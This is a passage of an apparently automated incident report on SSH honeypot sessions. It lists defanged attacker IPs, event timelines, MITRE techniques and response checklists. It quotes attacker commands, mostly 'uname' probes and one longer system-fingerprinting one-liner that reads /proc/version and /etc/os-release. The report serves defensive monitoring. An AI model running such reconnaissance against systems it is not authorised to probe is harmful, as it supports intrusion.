| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:55` | `cowrie.session.connect` |
| `2026-08-25 04:56:55` | `cowrie.client.version` |
| `2026-08-25 04:56:55` | `cowrie.client.kex` |
| `2026-08-25 04:56:56` | `cowrie.login.success` |
| `2026-08-25 04:56:57` | `cowrie.session.params` |
| `2026-08-25 04:56:57` | `cowrie.command.input` |
| `2026-08-25 04:56:57` | `cowrie.command.failed` |
| `2026-08-25 04:56:58` | `cowrie.log.closed` |
| `2026-08-25 04:56:59` | `cowrie.session.params` |
| `2026-08-25 04:56:59` | `cowrie.command.input` |
| `2026-08-25 04:56:59` | `cowrie.session.file_download` |
| `2026-08-25 04:56:59` | `cowrie.log.closed` |
| `2026-08-25 04:57:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.147[.]69` to AbuseIPDB if not already reported
- [ ] Block `165.154.147[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57daed11ceb2

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:57` | `cowrie.session.connect` |
| `2026-08-25 04:56:57` | `cowrie.client.version` |
| `2026-08-25 04:56:58` | `cowrie.client.kex` |
| `2026-08-25 04:56:58` | `cowrie.login.success` |
| `2026-08-25 04:56:59` | `cowrie.session.params` |
| `2026-08-25 04:56:59` | `cowrie.command.input` |
| `2026-08-25 04:57:00` | `cowrie.log.closed` |
| `2026-08-25 04:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b3a67cc5302

| Field | Detail |
|---|---|
| **Source IP** | `165.154.147[.]69` |
| **First Seen** | 2026-08-25 04:56 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:56:59` | `cowrie.session.connect` |
| `2026-08-25 04:56:59` | `cowrie.client.version` |
| `2026-08-25 04:57:00` | `cowrie.client.kex` |
| `2026-08-25 04:57:01` | `cowrie.login.success` |
| `2026-08-25 04:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.147[.]69` to AbuseIPDB if not already reported
- [ ] Block `165.154.147[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59a3b43f3fad

| Field | Detail |
|---|---|
| **Source IP** | `165.154.147[.]69` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:01` | `cowrie.session.connect` |
| `2026-08-25 04:57:01` | `cowrie.client.version` |
| `2026-08-25 04:57:01` | `cowrie.client.kex` |
| `2026-08-25 04:57:02` | `cowrie.login.success` |
| `2026-08-25 04:57:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.147[.]69` to AbuseIPDB if not already reported
- [ ] Block `165.154.147[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfbe5bdf28b0

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:02` | `cowrie.session.connect` |
| `2026-08-25 04:57:02` | `cowrie.client.version` |
| `2026-08-25 04:57:02` | `cowrie.client.kex` |
| `2026-08-25 04:57:02` | `cowrie.login.success` |
| `2026-08-25 04:57:03` | `cowrie.session.params` |
| `2026-08-25 04:57:03` | `cowrie.command.input` |
| `2026-08-25 04:57:03` | `cowrie.log.closed` |
| `2026-08-25 04:57:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3583d480440d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:06` | `cowrie.session.connect` |
| `2026-08-25 04:57:06` | `cowrie.client.version` |
| `2026-08-25 04:57:07` | `cowrie.client.kex` |
| `2026-08-25 04:57:07` | `cowrie.login.success` |
| `2026-08-25 04:57:08` | `cowrie.session.params` |
| `2026-08-25 04:57:08` | `cowrie.command.input` |
| `2026-08-25 04:57:08` | `cowrie.log.closed` |
| `2026-08-25 04:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b12dc24fff9

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:11` | `cowrie.session.connect` |
| `2026-08-25 04:57:11` | `cowrie.client.version` |
| `2026-08-25 04:57:11` | `cowrie.client.kex` |
| `2026-08-25 04:57:11` | `cowrie.login.success` |
| `2026-08-25 04:57:12` | `cowrie.session.params` |
| `2026-08-25 04:57:12` | `cowrie.command.input` |
| `2026-08-25 04:57:12` | `cowrie.log.closed` |
| `2026-08-25 04:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97fe7f964669

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:13` | `cowrie.session.connect` |
| `2026-08-25 04:57:13` | `cowrie.client.version` |
| `2026-08-25 04:57:14` | `cowrie.client.kex` |
| `2026-08-25 04:57:15` | `cowrie.login.success` |
| `2026-08-25 04:57:15` | `cowrie.direct-tcpip.request` |
| `2026-08-25 04:57:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 04:57:15` | `cowrie.direct-tcpip.data` |
| `2026-08-25 04:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8057480f4e2

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:16` | `cowrie.session.connect` |
| `2026-08-25 04:57:16` | `cowrie.client.version` |
| `2026-08-25 04:57:16` | `cowrie.client.kex` |
| `2026-08-25 04:57:16` | `cowrie.login.success` |
| `2026-08-25 04:57:17` | `cowrie.session.params` |
| `2026-08-25 04:57:17` | `cowrie.command.input` |
| `2026-08-25 04:57:17` | `cowrie.log.closed` |
| `2026-08-25 04:57:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9172886b2046

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:17` | `cowrie.session.connect` |
| `2026-08-25 04:57:17` | `cowrie.client.version` |
| `2026-08-25 04:57:17` | `cowrie.client.kex` |
| `2026-08-25 04:57:18` | `cowrie.login.success` |
| `2026-08-25 04:57:18` | `cowrie.direct-tcpip.request` |
| `2026-08-25 04:57:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 04:57:19` | `cowrie.direct-tcpip.data` |
| `2026-08-25 04:57:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06e0f4cdf1fa

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:20` | `cowrie.session.connect` |
| `2026-08-25 04:57:20` | `cowrie.client.version` |
| `2026-08-25 04:57:20` | `cowrie.client.kex` |
| `2026-08-25 04:57:21` | `cowrie.login.success` |
| `2026-08-25 04:57:21` | `cowrie.session.params` |
| `2026-08-25 04:57:21` | `cowrie.command.input` |
| `2026-08-25 04:57:22` | `cowrie.log.closed` |
| `2026-08-25 04:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fdeaec7cf3e

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:25` | `cowrie.session.connect` |
| `2026-08-25 04:57:25` | `cowrie.client.version` |
| `2026-08-25 04:57:25` | `cowrie.client.kex` |
| `2026-08-25 04:57:26` | `cowrie.login.success` |
| `2026-08-25 04:57:26` | `cowrie.session.params` |
| `2026-08-25 04:57:26` | `cowrie.command.input` |
| `2026-08-25 04:57:26` | `cowrie.log.closed` |
| `2026-08-25 04:57:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b3268d668a3

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:30` | `cowrie.session.connect` |
| `2026-08-25 04:57:30` | `cowrie.client.version` |
| `2026-08-25 04:57:30` | `cowrie.client.kex` |
| `2026-08-25 04:57:30` | `cowrie.login.success` |
| `2026-08-25 04:57:31` | `cowrie.session.params` |
| `2026-08-25 04:57:31` | `cowrie.command.input` |
| `2026-08-25 04:57:31` | `cowrie.log.closed` |
| `2026-08-25 04:57:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41dcac0620ed

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:35` | `cowrie.session.connect` |
| `2026-08-25 04:57:35` | `cowrie.client.version` |
| `2026-08-25 04:57:35` | `cowrie.client.kex` |
| `2026-08-25 04:57:35` | `cowrie.login.success` |
| `2026-08-25 04:57:36` | `cowrie.session.params` |
| `2026-08-25 04:57:36` | `cowrie.command.input` |
| `2026-08-25 04:57:36` | `cowrie.log.closed` |
| `2026-08-25 04:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92f2baca855a

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:39` | `cowrie.session.connect` |
| `2026-08-25 04:57:39` | `cowrie.client.version` |
| `2026-08-25 04:57:39` | `cowrie.client.kex` |
| `2026-08-25 04:57:39` | `cowrie.login.success` |
| `2026-08-25 04:57:40` | `cowrie.session.params` |
| `2026-08-25 04:57:40` | `cowrie.command.input` |
| `2026-08-25 04:57:40` | `cowrie.log.closed` |
| `2026-08-25 04:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0000c8433fec

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:44` | `cowrie.session.connect` |
| `2026-08-25 04:57:44` | `cowrie.client.version` |
| `2026-08-25 04:57:44` | `cowrie.client.kex` |
| `2026-08-25 04:57:44` | `cowrie.login.success` |
| `2026-08-25 04:57:45` | `cowrie.session.params` |
| `2026-08-25 04:57:45` | `cowrie.command.input` |
| `2026-08-25 04:57:45` | `cowrie.log.closed` |
| `2026-08-25 04:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-379098e5ac74

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:48` | `cowrie.session.connect` |
| `2026-08-25 04:57:48` | `cowrie.client.version` |
| `2026-08-25 04:57:49` | `cowrie.client.kex` |
| `2026-08-25 04:57:49` | `cowrie.login.success` |
| `2026-08-25 04:57:50` | `cowrie.session.params` |
| `2026-08-25 04:57:50` | `cowrie.command.input` |
| `2026-08-25 04:57:50` | `cowrie.log.closed` |
| `2026-08-25 04:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3d9899ba396

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:53` | `cowrie.session.connect` |
| `2026-08-25 04:57:53` | `cowrie.client.version` |
| `2026-08-25 04:57:53` | `cowrie.client.kex` |
| `2026-08-25 04:57:54` | `cowrie.login.success` |
| `2026-08-25 04:57:55` | `cowrie.session.params` |
| `2026-08-25 04:57:55` | `cowrie.command.input` |
| `2026-08-25 04:57:55` | `cowrie.log.closed` |
| `2026-08-25 04:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7171c91cc555

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:55` | `cowrie.session.connect` |
| `2026-08-25 04:57:55` | `cowrie.client.version` |
| `2026-08-25 04:57:55` | `cowrie.client.kex` |
| `2026-08-25 04:57:56` | `cowrie.login.success` |
| `2026-08-25 04:57:57` | `cowrie.session.params` |
| `2026-08-25 04:57:57` | `cowrie.command.input` |
| `2026-08-25 04:57:57` | `cowrie.command.input` |
| `2026-08-25 04:57:57` | `cowrie.command.input` |
| `2026-08-25 04:57:57` | `cowrie.command.input` |
| `2026-08-25 04:57:57` | `cowrie.command.input` |
| `2026-08-25 04:57:57` | `cowrie.command.success` |
| `2026-08-25 04:57:57` | `cowrie.command.input` |
| `2026-08-25 04:57:57` | `cowrie.command.input` |
| `2026-08-25 04:57:57` | `cowrie.command.input` |
| `2026-08-25 04:57:57` | `cowrie.command.input` |
| `2026-08-25 04:57:57` | `cowrie.log.closed` |
| `2026-08-25 04:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e7ec80b212f

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:57 |
| **Last Seen** | 2026-08-25 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:57:58` | `cowrie.session.connect` |
| `2026-08-25 04:57:58` | `cowrie.client.version` |
| `2026-08-25 04:57:58` | `cowrie.client.kex` |
| `2026-08-25 04:57:59` | `cowrie.login.success` |
| `2026-08-25 04:57:59` | `cowrie.session.params` |
| `2026-08-25 04:57:59` | `cowrie.command.input` |
| `2026-08-25 04:57:59` | `cowrie.log.closed` |
| `2026-08-25 04:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed532b2b3825

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:58 |
| **Last Seen** | 2026-08-25 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:58:03` | `cowrie.session.connect` |
| `2026-08-25 04:58:03` | `cowrie.client.version` |
| `2026-08-25 04:58:03` | `cowrie.client.kex` |
| `2026-08-25 04:58:03` | `cowrie.login.success` |
| `2026-08-25 04:58:04` | `cowrie.session.params` |
| `2026-08-25 04:58:04` | `cowrie.command.input` |
| `2026-08-25 04:58:04` | `cowrie.log.closed` |
| `2026-08-25 04:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2643af0ddd7c

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:58 |
| **Last Seen** | 2026-08-25 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:58:07` | `cowrie.session.connect` |
| `2026-08-25 04:58:07` | `cowrie.client.version` |
| `2026-08-25 04:58:08` | `cowrie.client.kex` |
| `2026-08-25 04:58:08` | `cowrie.login.success` |
| `2026-08-25 04:58:09` | `cowrie.session.params` |
| `2026-08-25 04:58:09` | `cowrie.command.input` |
| `2026-08-25 04:58:09` | `cowrie.log.closed` |
| `2026-08-25 04:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79934a04f388

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:58 |
| **Last Seen** | 2026-08-25 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:58:12` | `cowrie.session.connect` |
| `2026-08-25 04:58:12` | `cowrie.client.version` |
| `2026-08-25 04:58:12` | `cowrie.client.kex` |
| `2026-08-25 04:58:13` | `cowrie.login.success` |
| `2026-08-25 04:58:13` | `cowrie.session.params` |
| `2026-08-25 04:58:13` | `cowrie.command.input` |
| `2026-08-25 04:58:13` | `cowrie.log.closed` |
| `2026-08-25 04:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bdc211a1684

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:58 |
| **Last Seen** | 2026-08-25 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:58:17` | `cowrie.session.connect` |
| `2026-08-25 04:58:17` | `cowrie.client.version` |
| `2026-08-25 04:58:17` | `cowrie.client.kex` |
| `2026-08-25 04:58:18` | `cowrie.login.success` |
| `2026-08-25 04:58:19` | `cowrie.session.params` |
| `2026-08-25 04:58:19` | `cowrie.command.input` |
| `2026-08-25 04:58:19` | `cowrie.log.closed` |
| `2026-08-25 04:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-967212876c23

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:58 |
| **Last Seen** | 2026-08-25 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:58:22` | `cowrie.session.connect` |
| `2026-08-25 04:58:22` | `cowrie.client.version` |
| `2026-08-25 04:58:22` | `cowrie.client.kex` |
| `2026-08-25 04:58:23` | `cowrie.login.success` |
| `2026-08-25 04:58:23` | `cowrie.session.params` |
| `2026-08-25 04:58:23` | `cowrie.command.input` |
| `2026-08-25 04:58:24` | `cowrie.log.closed` |
